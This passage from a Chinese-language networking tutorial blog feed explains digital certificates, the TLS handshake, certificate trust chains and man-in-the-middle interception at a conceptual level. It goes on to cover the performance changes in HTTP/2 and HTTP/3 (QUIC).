aria-hidden="true">image-20240324150753226</figcaption></figure><p>引入了数字签名算法后，你就无法模仿你爸爸的字迹来请假了，你爸爸手上持有着私钥，你老师持有着公钥。这样只有用你爸爸手上的私钥才对请假条进行「签名」，老师通过公钥看能不能解出这个「签名」，如果能解出并且确认内容的完整性，就能证明是由你爸爸发起的请假条，这样老师才允许你请假，否则老师就不认。</p><h3 id="数字证书">4.3.4 数字证书</h3><p>前面我们知道：</p><ul><li>可以通过哈希算法来保证消息的完整性；</li><li>可以通过数字签名来保证消息的来源可靠性（能确认消息是由持有私钥的一方发送的）；</li></ul><p>但是这还远远不够，还<strong>缺少身份验证</strong>的环节，万一公钥是被伪造的呢？</p><p>还是拿请假的例子，虽然你爸爸持有私钥，老师通过是否能用公钥解密来确认这个请假条是不是来源你父亲的。但是我们还可以自己伪造出一对公私钥啊！你找了个夜晚，偷偷把老师桌面上和你爸爸配对的公钥，换成了你的公钥，那么下次你在请假的时候，你继续模仿你爸爸的字迹写了个请假条，然后用你的私钥做个了「数字签名」。但是老师并不知道自己的公钥被你替换过了，所以他还是按照往常一样用公钥解密，由于这个公钥和你的私钥是配对的，老师当然能用这个被替换的公钥解密出来，并且确认了内容的完整性，于是老师就会以为是你父亲写的请假条，又允许你请假了。后面你的老师和父亲发现了你伪造公私钥的事情后，决定重新商量一个对策来应对你这个臭家伙。</p><p>既然伪造公私钥那么随意，所以你爸把他的公钥注册到警察局，警察局用他们自己的私钥对你父亲的公钥做了个数字签名，然后把你爸爸的「个人信息+ 公钥 +数字签名」打包成一个<strong>数字证书</strong>，也就是说这个数字证书包含你爸爸的公钥。这样，你爸爸如果因为家里确实有事要向老师帮你请假的时候，不仅会用自己的私钥对内容进行签名，还会把数字证书给到老师。老师拿到了数字证书后，首先会去警察局<strong>验证这个数字证书是否合法</strong>，因为数字证书里有警察局的数字签名，警察局要验证证书合法性的时候，用自己的公钥解密，如果能解密成功，就说明这个数字证书是在警察局注册过的，就认为该数字证书是合法的，然后就会把数字证书里头的公钥（你爸爸的）给到老师。由于通过警察局验证了数字证书是合法的，那么就能证明这个公钥就是你父亲的，于是老师就可以安心的用这个公钥解密出请假条，如果能解密出，就证明是你爸爸写的请假条。正是通过了一个权威的机构来证明你爸爸的身份，所以你的伪造公私钥这个小伎俩就没用了。</p><p>在计算机里，这个权威的机构就是 <strong>CA（数字证书认证机构）</strong>，将服务器公钥放在数字证书（由数字证书认证机构颁发）中，只要证书是可信的，公钥就是可信的，解决冒充的风险。数字证书的工作流程如下：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612816.png"alt="image-20240324151303838" /><figcaption aria-hidden="true">image-20240324151303838</figcaption></figure><h2 id="https-连接建立">4.3 HTTPS 连接建立</h2><p>SSL/TLS 协议基本流程：</p><ul><li>客户端向服务器索要并验证服务器的公钥。</li><li>双方协商生产「会话秘钥」。</li><li>双方采用「会话秘钥」进行加密通信。</li></ul><p>前两步也就是 SSL/TLS 的建立过程，也就是 TLS 握手阶段。TLS的「握手阶段」涉及<strong>四次</strong>通信，使用不同的密钥交换算法，TLS握手流程也会不一样的，现在常用的密钥交换算法有两种：RSA 算法 和 ECDHE算法。</p><p>基于 RSA 算法的 TLS 握手过程比较容易理解，流程如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612817.png"alt="HTTPS 连接建立过程" /><figcaption aria-hidden="true">HTTPS 连接建立过程</figcaption></figure><h3 id="clienthello">4.3.1 ClientHello</h3><p>首先，由客户端向服务器发起加密通信请求，也就是<code>ClientHello</code>请求。在这一步，客户端主要向服务器发送以下信息：</p><ul><li>客户端支持的 TLS 协议版本，如 TLS 1.2 版本。</li><li>客户端生产的随机数（<code>Client Random</code>），后面用于生成「会话秘钥」条件之一。</li><li>客户端支持的密码套件列表，如 RSA 加密算法。</li></ul><h3 id="severhello">4.3.2 SeverHello</h3><p>服务器收到客户端请求后，向客户端发出响应，也就是<code>SeverHello</code>。服务器回应的内容有如下内容：</p><ul><li>确认 TLS 协议版本，如果浏览器不支持，则关闭加密通信。</li><li>服务器生产的随机数（<code>Server Random</code>），也是后面用于生产「会话秘钥」条件之一。</li><li>确认的密码套件列表，如 RSA 加密算法。</li><li>服务器的数字证书。</li></ul><h3 id="客户端回应">4.3.3 客户端回应</h3><p>客户端收到服务器的回应之后，首先通过浏览器或者操作系统中的 CA公钥，确认服务器的数字证书的真实性。如果证书没有问题，客户端会<strong>从数字证书中取出服务器的公钥</strong>，然后使用它加密报文，向服务器发送如下信息：</p><ul><li>一个随机数（<code>pre-master key</code>）。该随机数会被服务器公钥加密。</li><li>加密通信算法改变通知，表示随后的信息都将用「会话秘钥」加密通信。</li><li>客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时把之前所有内容的发生的数据做个摘要，用来供服务端校验。</li></ul><p>上面第一项的随机数是整个握手阶段的第三个随机数，会发给服务端，所以这个随机数客户端和服务端都是一样的。<strong>服务器和客户端有了这三个随机数（ClientRandom、Server Random、pre-masterkey），接着就用双方协商的加密算法，各自生成本次通信的「会话秘钥」</strong>。</p><h3 id="服务器的最后回应">4.3.4 服务器的最后回应</h3><p>服务器收到客户端的第三个随机数（<code>pre-master key</code>）之后，通过协商的加密算法，计算出本次通信的「会话秘钥」。然后，向客户端发送最后的信息：</p><ul><li>加密通信算法改变通知，表示随后的信息都将用「会话秘钥」加密通信。</li><li>服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时把之前所有内容的发生的数据做个摘要，用来供客户端校验。</li></ul><p>至此，整个 TLS的握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的HTTP 协议，只不过用「会话秘钥」加密内容。</p><h3 id="补充证书校验流程">4.3.5 补充：证书校验流程</h3><p>数字证书签发和验证流程如下图所示：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612818.png"alt="image-20240324152926008" /><figcaption aria-hidden="true">image-20240324152926008</figcaption></figure><h4 id="证书签发">4.3.5.1 证书签发</h4><p>CA 签发证书的过程，如上图左边部分：</p><ul><li>首先 CA会把持有者的公钥、用途、颁发者、有效时间等信息打成一个包，然后对这些信息进行Hash 计算，得到一个 Hash 值；</li><li>然后 CA 会使用自己的私钥将该 Hash 值加密，生成 CertificateSignature，也就是 CA 对证书做了签名；</li><li>最后将 Certificate Signature 添加在文件证书上，形成数字证书；</li></ul><h4 id="证书校验">4.3.5.2 证书校验</h4><p>客户端校验服务端的数字证书的过程，如上图右边部分：</p><ul><li>首先客户端会使用同样的 Hash 算法获取该证书的 Hash 值 H1；</li><li>通常浏览器和操作系统中集成了 CA 的公钥信息，浏览器收到证书后可以使用CA 的公钥解密 Certificate Signature 内容，得到一个 Hash 值 H2 ；</li><li>最后比较 H1 和H2，如果值相同，则为可信赖的证书，否则则认为证书不可信。</li></ul><h4 id="证书信任链">4.3.5.3 证书信任链</h4><p>事实上，证书的验证过程中还存在一个<strong>证书信任链</strong>的问题，因为我们向CA申请的证书一般不是根证书签发的，而是由中间证书签发的，比如百度的证书，从下图你可以看到，证书的层级有三级：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612819.png"alt="image-20240324153101857" /><figcaption aria-hidden="true">image-20240324153101857</figcaption></figure><p>对于这种三级层级关系的证书的验证过程如下：</p><ul><li>客户端收到 baidu.com的证书后，发现这个证书的签发者不是根证书，就无法根据本地已有的根证书中的公钥去验证baidu.com 证书是否可信。于是，客户端根据 baidu.com证书中的签发者，找到该证书的颁发机构是 “GlobalSign OrganizationValidation CA - SHA256 - G2”，然后向 CA 请求该中间证书。</li><li>请求到证书后发现 “GlobalSign Organization Validation CA - SHA256 -G2” 证书是由 “GlobalSign Root CA” 签发的，由于 “GlobalSign Root CA”没有再上级签发机构，说明它是根证书，也就是自签证书。应用软件会检查此证书有否已预载于根证书清单上，如果有，则可以利用根证书中的公钥去验证“GlobalSign Organization Validation CA - SHA256 - G2”证书，如果发现验证通过，就认为该中间证书是可信的。</li><li>“GlobalSign Organization Validation CA - SHA256 - G2”证书被信任后，可以使用 “GlobalSign Organization Validation CA - SHA256 -G2” 证书中的公钥去验证 baidu.com 证书的可信性，如果验证通过，就可以信任baidu.com 证书。</li></ul><p>在这四个步骤中，最开始客户端只信任根证书 GlobalSign Root CA证书的，然后 “GlobalSign Root CA” 证书信任 “GlobalSign OrganizationValidation CA - SHA256 - G2” 证书，而 “GlobalSign OrganizationValidation CA - SHA256 - G2” 证书又信任 baidu.com 证书，于是客户端也信任baidu.com 证书。</p><p>总的来说，由于用户信任 GlobalSign，所以由 GlobalSign 所担保的baidu.com可以被信任，另外由于用户信任操作系统或浏览器的软件商，所以由软件商预载了根证书的GlobalSign 都可被信任。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612820.png"alt="image-20240324153232637" /><figcaption aria-hidden="true">image-20240324153232637</figcaption></figure><p>操作系统里一般都会内置一些根证书，如下图所示：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612821.png"alt="image-20240324153256111" /><figcaption aria-hidden="true">image-20240324153256111</figcaption></figure><p>这样的一层层地验证就构成了一条信任链路，整个证书信任链验证流程如下图所示：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612822.png"alt="image-20240324153330208" /><figcaption aria-hidden="true">image-20240324153330208</figcaption></figure><blockquote><p>为什么需要证书链这么麻烦的流程？Root CA为什么不直接颁发证书，而是要搞那么多中间层级呢？</p><p><strong>为了确保根证书的绝对安全性，将根证书隔离地越严格越好，不然根证书如果失守了，那么整个信任链都会有问题。</strong></p></blockquote><h2 id="https-的应用数据如何保证完整性">4.4 HTTPS的应用数据如何保证完整性</h2><p>TLS在实现上分为<strong>握手协议</strong>和<strong>记录协议</strong>两层：</p><ul><li>TLS 握手协议就是我们前面说的 TLS四次握手的过程，负责协商加密算法和生成对称密钥，后续用此密钥来保护应用程序数据（即HTTP 数据）；</li><li>TLS 记录协议负责保护应用程序数据并验证其完整性和来源，所以对 HTTP数据加密是使用记录协议；</li></ul><p>TLS 记录协议主要负责消息（HTTP数据）的压缩，加密及认证，过程如下图：</p><ul><li>消息被分割成多个较短的片段,然后分别对每个片段进行压缩。</li><li>经过压缩的片段会被加上<strong>消息认证码</strong>（MAC值，这个是通过哈希算法生成的），这是为了保证完整性，并进行数据的认证。通过附加消息认证码的MAC值，可以识别出篡改。与此同时，为了防止重放攻击，在计算消息认证码时，还加上了片段的编码。</li><li>经过压缩的片段再加上消息认证码会一起通过对称密码进行加密。</li><li>上述经过加密的数据再加上由数据类型、版本号、压缩后的长度组成的报头就是最终的报文数据。</li></ul><p>记录协议完成后，最终的报文数据将传递到传输控制协议 (TCP)层进行传输。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612823.png"alt="image-20240324153540601" /><figcaption aria-hidden="true">image-20240324153540601</figcaption></figure><h2 id="https-安全性">4.5 HTTPS 安全性</h2><h3 id="中间人攻击">4.5.1 中间人攻击</h3><p>这个问题的场景是这样的：客户端通过浏览器向服务端发起 HTTPS请求时，被「假基站」转发到了一个「中间人服务器」，于是客户端是和「中间人服务器」完成了TLS 握手，然后这个「中间人服务器」再与真正的服务端完成 TLS 握手。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612824.png"alt="image-20240324153849811" /><figcaption aria-hidden="true">image-20240324153849811</figcaption></figure><p>具体过程如下：</p><ul><li>客户端向服务端发起 HTTPS建立连接请求时，然后被「假基站」转发到了一个「中间人服务器」，接着中间人向服务端发起HTTPS 建立连接请求，此时客户端与中间人进行 TLS 握手，中间人与服务端进行TLS 握手；</li><li>在客户端与中间人进行 TLS握手过程中，中间人会发送自己的公钥证书给客户端，客户端验证证书的真伪，然后从证书拿到公钥，并生成一个随机数，用公钥加密随机数发送给中间人，中间人使用私钥解密，得到随机数，此时双方都有随机数，然后通过算法生成对称加密密钥（A），后续客户端与中间人通信就用这个对称加密密钥来加密数据了。</li><li>在中间人与服务端进行 TLS 握手过程中，服务端会发送从 CA机构签发的公钥证书给中间人，从证书拿到公钥，并生成一个随机数，用公钥加密随机数发送给服务端，服务端使用私钥解密，得到随机数，此时双方都有随机数，然后通过算法生成对称加密密钥（B），后续中间人与服务端通信就用这个对称加密密钥来加密数据了。</li><li>后续的通信过程中，中间人用对称加密密钥（A）解密客户端的 HTTPS请求的数据，然后用对称加密密钥（B）加密 HTTPS请求后，转发给服务端，接着服务端发送 HTTPS响应数据给中间人，中间人用对称加密密钥（B）解密 HTTPS响应数据，然后再用对称加密密钥（A）加密后，转发给客户端。</li></ul><p>从客户端的角度看，其实并不知道网络中存在中间人服务器这个角色。那么中间人就可以解开浏览器发起的HTTPS 请求里的数据，也可以解开服务端响应给浏览器的 HTTPS响应数据。相当于，中间人能够 “偷看” 浏览器与服务端之间的 HTTPS请求和响应的数据。但是要发生这种攻击是有前提的，即用户点击接受了中间人服务器的证书。中间人服务器与客户端在TLS握手过程中，实际上发送了自己伪造的证书给浏览器，而这个伪造的证书是能被浏览器（客户端）识别出是非法的，于是就会提醒用户该证书存在问题。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612825.png"alt="image-20240324154033874" /><figcaption aria-hidden="true">image-20240324154033874</figcaption></figure><p>如果用户执意点击「继续浏览此网站」，相当于用户接受了中间人伪造的证书，那么后续整个HTTPS 通信都能被中间人监听了。所以，这其实并不能说 HTTPS不够安全，毕竟浏览器都已经提示证书有问题了，如果用户坚决要访问，那不能怪HTTPS ，得怪自己手贱。</p><p>另外，如果你的电脑中毒了，被恶意导入了中间人的根证书，那么在验证中间人的证书的时候，由于你操作系统信任了中间人的根证书，那么等同于中间人的证书是合法的，这种情况下，浏览器是不会弹出证书存在问题的风险提醒的。这其实也不关HTTPS 的事情，是你电脑中毒了才导致 HTTPS 数据被中间人劫持的。</p><p>因此，HTTPS协议本身到目前为止还是<strong>没有任何漏洞</strong>的，即使你成功进行中间人攻击，本质上是利用了客户端的漏洞（用户点击继续访问或者被恶意导入伪造的根证书），并不是HTTPS 不够安全。</p><h3 id="抓包工具原理">4.5.2 抓包工具原理</h3><p>很多抓包工具 之所以可以明文看到 HTTPS数据，工作原理与中间人一致的。对于 HTTPS连接来说，中间人要满足以下两点，才能实现真正的明文代理:</p><ol type="1"><li>中间人，作为客户端与真实服务端建立连接这一步不会有问题，因为服务端不会校验客户端的身份；</li><li>中间人，作为服务端与真实客户端建立连接，这里会有客户端信任服务端的问题，也就是服务端必须有对应域名的私钥；</li></ol><p>中间人要拿到私钥只能通过如下方式：</p><ol type="1"><li>去网站服务端拿到私钥；</li><li>去CA处拿域名签发私钥；</li><li>自己签发证书，且要被浏览器信任；</li></ol><p>不用解释，抓包工具只能使用第三种方式取得中间人的身份。使用抓包工具进行HTTPS 抓包的时候，需要在客户端安装 Fiddler的根证书，这里实际上起认证中心（CA）的作用。抓包工具能够抓包的关键是客户端会往系统受信任的根证书列表中导入抓包工具生成的证书，而这个证书会被浏览器信任，也就是抓包工具给自己创建了一个认证中心CA，客户端拿着中间人签发的证书去中间人自己的 CA去认证，当然认为这个证书是有效的。</p><h3 id="双向认证">4.5.3 双向认证</h3><p>我们要保证自己电脑的安全，不要被病毒乘虚而入，而且也不要点击任何证书非法的网站，这样HTTPS 数据就不会被中间人截取到了。当然，我们还可以通过 <strong>HTTPS双向认证</strong>来避免这种问题。一般我们的 HTTPS是单向认证，客户端只会验证了服务端的身份，但是服务端并不会验证客户端的身份。如果用了双向认证方式，不仅客户端会验证服务端的身份，而且服务端也会验证客户端的身份。服务端一旦验证到请求自己的客户端为不可信任的，服务端就拒绝继续通信，客户端如果发现服务端为不可信任的，那么也中止通信。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612826.png"alt="image-20240324154243694" /><figcaption aria-hidden="true">image-20240324154243694</figcaption></figure><h1 id="http1.1http2http3-演变">5. HTTP/1.1、HTTP/2、HTTP/3 演变</h1><h2 id="http1.1-相比-http1.0-提高了什么性能">5.1 HTTP/1.1 相比 HTTP/1.0提高了什么性能？</h2><p>HTTP/1.1 相比 HTTP/1.0 性能上的改进：</p><ul><li><strong>长连接</strong>：改善了 HTTP/1.0 短连接造成的性能开销。</li><li><strong>管道（pipeline）网络传输</strong>：只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以减少整体的响应时间。</li></ul><p>但 HTTP/1.1 还是有性能瓶颈：</p><ul><li>请求 /响应头部（Header）未经压缩就发送，首部信息越多延迟越大。只能压缩<code>Body</code> 的部分；</li><li>发送冗长的首部。每次互相发送相同的首部造成的浪费较多；</li><li>服务器是按请求的顺序响应的，如果服务器响应慢，会招致客户端一直请求不到数据，也就是队头阻塞；</li><li>没有请求优先级控制；</li><li>请求只能从客户端开始，服务器只能被动响应。</li></ul><h2 id="http2-做了哪些优化">5.2 HTTP/2 做了哪些优化？</h2><p>HTTP/2 协议是基于 HTTPS 的，所以 HTTP/2 的安全性是有保障的。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612827.png"alt="image-20240324154939629" /><figcaption aria-hidden="true">image-20240324154939629</figcaption></figure><p>那 HTTP/2 相比 HTTP/1.1 性能上的改进：</p><ul><li>头部压缩</li><li>二进制格式</li><li>并发传输</li><li>服务器主动推送资源</li></ul><h3 id="头部压缩">5.2.1 头部压缩</h3><p>HTTP/2会<strong>压缩头</strong>（Header），如果你同时发出多个请求，他们的头是一样的或是相似的，那么协议会帮你<strong>消除重复的部分</strong>。</p><p>这就是所谓的 <code>HPACK</code>算法：在客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就<strong>提高速度</strong>了。</p><h3 id="二进制格式">5.2.2 二进制格式</h3><p>HTTP/2 不再像 HTTP/1.1里的纯文本形式的报文，而是全面采用了<strong>二进制格式</strong>，头信息和数据体都是二进制，并且统称为帧（frame）：<strong>头信息帧（HeadersFrame）和数据帧（Data Frame）</strong>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612828.png"alt="image-20240324155240162" /><figcaption aria-hidden="true">image-20240324155240162</figcaption></figure><p>这样虽然对人不友好，但是对计算机非常友好，因为计算机只懂二进制，那么收到报文后，无需再将明文的报文转成二进制，而是直接解析二进制报文，这<strong>增加了数据传输的效率</strong>。</p><p>比如状态码 200 ，在 HTTP/1.1 是用 '2''0''0'三个字符来表示（二进制：00110010 00110000 00110000），共用了 3个字节，如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612829.png"alt="image-20240324155307912" /><figcaption aria-hidden="true">image-20240324155307912</figcaption></figure><p>在 HTTP/2 对于状态码 200 的二进制编码是 10001000，只用了 1字节就能表示，相比于 HTTP/1.1 节省了 2 个字节，如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612830.png"alt="image-20240324155450874" /><figcaption aria-hidden="true">image-20240324155450874</figcaption></figure><p>Header: :status: 200 OK 的编码内容为：10001000，那么表达的含义是什么呢？</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612831.png"alt="image-20240324155510192" /><figcaption aria-hidden="true">image-20240324155510192</figcaption></figure><ol type="1"><li>最前面的 1 标识该 <code>Header</code>是静态表中已经存在的键值对。</li><li>在静态表里，<code>:status: 200 ok</code>静态表编码是 8，二进制即是1000。</li></ol><p>因此，整体加起来就是 1000 1000。</p><h3 id="并发传输">5.2.3 并发传输</h3><p>HTTP/1.1 的实现是基于请求-响应模型的。同一个连接中，HTTP完成一个事务（请求与响应），才能处理下一个事务，也就是说在发出请求等待响应的过程中，是没办法做其他事情的，如果响应迟迟不来，那么后续的请求是无法发送的，也造成了<strong>队头阻塞</strong>的问题。而HTTP/2 引出了 Stream 概念，多个 Stream 复用在一条 TCP 连接。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612832.png"alt="image-20240324155651407" /><figcaption aria-hidden="true">image-20240324155651407</figcaption></figure><p>从上图可以看到，1 个 TCP 连接包含多个 Stream，Stream 里可以包含 1个或多个 Message，Message 对应 HTTP/1 中的请求或响应，由 HTTP头部和包体构成。Message 里包含一条或者多个 Frame，Frame 是 HTTP/2最小单位，以二进制压缩格式存放 HTTP/1 中的内容（头部和包体）。</p><p>针对不同的 HTTP 请求用独一无二的 <strong>Stream ID</strong>来区分，接收端可以通过 Stream ID 有序组装成 HTTP 消息，不同 Stream的帧是可以乱序发送的，因此可以并发不同的 Stream ，也就是 HTTP/2可以并行交错地发送请求和响应。比如下图，服务端<strong>并行交错地</strong>发送了两个响应：Stream 1 和 Stream 3，这两个 Stream 都是跑在一个 TCP连接上，客户端收到后，会根据相同的 Stream ID 有序组装成 HTTP 消息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612833.png"alt="image-20240324155801691" /><figcaption aria-hidden="true">image-20240324155801691</figcaption></figure><h3 id="服务器推送">5.2.4 服务器推送</h3><p>HTTP/2 还在一定程度上改善了传统的「请求 -应答」工作模式，服务端不再是被动地响应，可以<strong>主动</strong>向客户端发送消息。客户端和服务器<strong>双方都可以建立Stream</strong>， Stream ID 也是有区别的，客户端建立的 Stream必须是奇数号，而服务器建立的 Stream 必须是偶数号。</p><p>比如下图，Stream 1 是客户端向服务端请求的资源，属于客户端建立的Stream，所以该 Stream 的 ID 是奇数（数字 1）；Stream 2 和 4都是服务端主动向客户端推送的资源，属于服务端建立的 Stream，所以这两个Stream 的 ID 是偶数（数字 2 和 4）。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612834.png"alt="image-20240324155958814" /><figcaption aria-hidden="true">image-20240324155958814</figcaption></figure><p>再比如，客户端通过 HTTP/1.1 请求从服务器那获取到了 HTML 文件，而 HTML可能还需要依赖 CSS 来渲染页面，这时客户端还要再发起获取 CSS文件的请求，需要两次消息往返，如下图左边部分；在 HTTP/2 中，客户端在访问HTML 时，服务器可以直接主动推送 CSS文件，减少了消息传递的次数，如下图右边部分。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612835.png"alt="image-20240324160024917" /><figcaption aria-hidden="true">image-20240324160024917</figcaption></figure><h3 id="缺点">5.2.5 缺点</h3><p>HTTP/2 通过 Stream 的并发能力，解决了 HTTP/1队头阻塞的问题，看似很完美了，但是 HTTP/2还是存在“队头阻塞”的问题，只不过问题不是在 HTTP 这一层面，而是在 TCP这一层。</p><p>HTTP/2 是<strong>基于 TCP 协议</strong>来传输数据的，TCP是<strong>字节流协议</strong>，TCP层必须保证收到的字节数据是完整且连续的，这样内核才会将缓冲区里的数据返回给HTTP 应用，那么当「前 1个字节数据」没有到达时，后收到的字节数据只能存放在内核缓冲区里，只有等到这1 个字节数据到达时，HTTP/2 应用层才能从内核中拿到数据，这就是 HTTP/2队头阻塞问题。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612836.png"alt="image-20240324160114764" /><figcaption aria-hidden="true">image-20240324160114764</figcaption></figure><p>举个例子，如下图。图中发送方发送了很多个 packet，每个 packet都有自己的序号，你可以认为是 TCP 的序列号，其中 packet 3在网络中丢失了，即使 packet 4-6 被接收方收到后，由于内核中的 TCP数据不是连续的，于是接收方的应用层就无法从内核中读取到，只有等到 packet3 重传后，接收方的应用层才可以从内核中读取到数据，这就是 HTTP/2的队头阻塞问题，是在 TCP 层面发生的。所以，一旦发生了丢包现象，就会触发TCP 的重传机制，这样在一个 TCP 连接中的<strong>所有的 HTTP请求都必须等待这个丢了的包被重传回来</strong>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612837.png"alt="image-20240324160146389" /><figcaption aria-hidden="true">image-20240324160146389</figcaption></figure><h2 id="http3-做了哪些优化">5.3 HTTP/3 做了哪些优化？</h2><p>前面我们知道了 HTTP/1.1 和 HTTP/2 都有队头阻塞的问题：</p><ul><li>HTTP/1.1 中的管道（pipeline）虽然解决了请求的队头阻塞，但是没有解决<strong>响应的队头阻塞</strong>，因为服务端需要按顺序响应收到的请求，如果服务端处理某个请求消耗的时间比较长，那么只能等响应完这个请求后，才能处理下一个请求，这属于 HTTP 层队头阻塞。</li><li>HTTP/2 虽然通过多个请求复用一个 TCP 连接解决了 HTTP 的队头阻塞，但是一旦发生丢包，就会阻塞住所有的 HTTP 请求，这属于 <strong>TCP层队头阻塞</strong>。</li></ul><p>HTTP/2 队头阻塞的问题是因为 TCP，所以 HTTP/3 把 HTTP 下层的 TCP协议改成了 <strong>UDP协议</strong>！</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612838.png"alt="image-20240324160345769" /><figcaption aria-hidden="true">image-20240324160345769</figcaption></figure><p>UDP 发送是不管顺序，也不管丢包的，所以不会出现像 HTTP/2队头阻塞的问题。大家都知道 UDP 是不可靠传输的，但基于 UDP 的<strong>QUIC 协议</strong> 可以实现类似 TCP 的可靠性传输。</p><p>QUIC 有以下 3 个特点。</p><ul><li>无队头阻塞</li><li>更快的连接建立</li><li>连接迁移</li></ul><h3 id="无队头阻塞">5.3.1 无队头阻塞</h3><p>QUIC 协议也有类似 HTTP/2 Stream与多路复用的概念，也是可以在同一条连接上并发传输多个 Stream，Stream可以认为就是一条 HTTP 请求。QUIC有自己的一套机制可以保证传输的可靠性的。<strong>当某个流发生丢包时，只会阻塞这个流，其他流不会受到影响，因此不存在队头阻塞问题</strong>。这与HTTP/2 不同，HTTP/2只要某个流中的数据包丢失了，其他流也会因此受影响。所以，QUIC连接上的多个 Stream之间并没有依赖，都是独立的，某个流发生丢包了，只会影响该流，其他流不受影响。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612839.png"alt="image-20240324160507578" /><figcaption aria-hidden="true">image-20240324160507578</figcaption></figure><h3 id="更快的连接建立">5.3.2 更快的连接建立</h3><p>对于 HTTP/1 和 HTTP/2 协议，TCP 和 TLS是分层的，分别属于内核实现的传输层、openssl库实现的表示层，因此它们难以合并在一起，需要分批次来握手，先 TCP握手，再 TLS 握手。</p><p>HTTP/3 在传输数据前虽然需要 QUIC 协议握手，但是这个握手过程只需要 1RTT，握手的目的是为确认双方的「连接 ID」，连接迁移就是基于连接 ID实现的。但是 HTTP/3 的 QUIC 协议并不是与 TLS 分层，而是 QUIC 内部包含了TLS，它在自己的帧会携带 TLS 里的“记录”，再加上 QUIC 使用的是TLS/1.3，因此仅需 1 个 RTT就可以「同时」完成建立连接与密钥协商，如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404091645691.png"alt="image-20240409164502533" /><figcaption aria-hidden="true">image-20240409164502533</figcaption></figure><p>甚至，在第二次连接的时候，应用数据包可以和 QUIC 握手信息（连接信息 +TLS 信息）一起发送，达到 0-RTT 的效果。如下图右边部分，HTTP/3当会话恢复时，有效负载数据与第一个数据包一起发送，可以做到0-RTT（下图的右下角）：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612841.png"alt="image-20240324160857080" /><figcaption aria-hidden="true">image-20240324160857080</figcaption></figure><h3 id="连接迁移">5.3.3 连接迁移</h3><p>基于 TCP 传输协议的 HTTP 协议，由于是通过四元组（源 IP、源端口、目的IP、目的端口）确定一条 TCP 连接。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612842.png"alt="image-20240324161034111" /><figcaption aria-hidden="true">image-20240324161034111</figcaption></figure><p>那么<strong>当移动设备的网络从 4G 切换到 WIFI 时，意味着 IP地址变化了，那么就必须要断开连接，然后重新建立连接</strong>。而建立连接的过程包含TCP 三次握手和 TLS 四次握手的时延，以及 TCP慢启动的减速过程，给用户的感觉就是网络突然卡顿了一下，因此连接的迁移成本是很高的。</p><p>而 QUIC 协议没有用四元组的方式来“绑定”连接，而是通过<strong>连接ID</strong> 来标记通信的两个端点，客户端和服务器可以各自选择一组 ID来标记自己，因此即使移动设备的网络变化后，导致 IP地址变化了，只要仍保有上下文信息（比如连接 ID、TLS密钥等），就可以“无缝”地复用原连接，消除重连的成本，没有丝毫卡顿感，达到了<strong>连接迁移</strong>的功能。</p><p>所以， QUIC 是一个在 UDP 之上的<strong>伪</strong> TCP + TLS + HTTP/2的多路复用的协议。QUIC 是新协议，对于很多网络设备，根本不知道什么是QUIC，只会当做 UDP，这样会出现新的问题，因为有的网络设备是会丢掉 UDP包的，而 QUIC 是基于 UDP 实现的，那么如果网络设备无法识别这个是 QUIC包，那么就会当作 UDP包，然后被丢弃。</p><p><strong>参考资料：</strong></p><ol type="1"><li>图解网络：https://xiaolincoding.com/network</li><li>URI和URL的概念和区别：https://juejin.cn/post/6992383657340551204</li><li>MDN Web docs：https://developer.mozilla.org/zh-CN/docs/Web/HTTP</li></ol>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>计算机网络</category>
      
      <category>图解网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>概述</title>
